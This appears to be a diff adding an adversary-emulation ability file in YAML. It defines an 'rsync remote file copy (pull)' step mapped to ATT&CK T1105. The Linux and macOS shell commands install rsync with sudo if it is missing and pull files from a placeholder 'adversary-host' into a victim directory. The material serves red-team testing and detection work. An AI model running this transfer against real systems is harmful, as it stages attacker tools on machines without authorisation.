@@ -1,0 +1,25 @@
+---
+- id: ef9ac1316599e943e63ed5d446d89348
+  name: rsync remote file copy (pull)
+  description: 'Utilize rsync to perform a remote file copy (pull)
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -x "$(command -v rsync)" ]; then : ; else (pkg install -y rsync)||(sudo
+          apt-get -y install rsync); fi;  rsync -r adversary@adversary-host:/tmp/adversary-rsync/
+          /tmp/victim-files'
+        payloads: []
+        cleanup: ''
+    darwin:
+      sh:
+        command: 'if [ -x "$(command -v rsync)" ]; then : ; else (pkg install -y rsync)||(sudo
+          apt-get -y install rsync); fi;  rsync -r adversary@adversary-host:/tmp/adversary-rsync/
+          /tmp/victim-files'
+        payloads: []
+        cleanup: ''
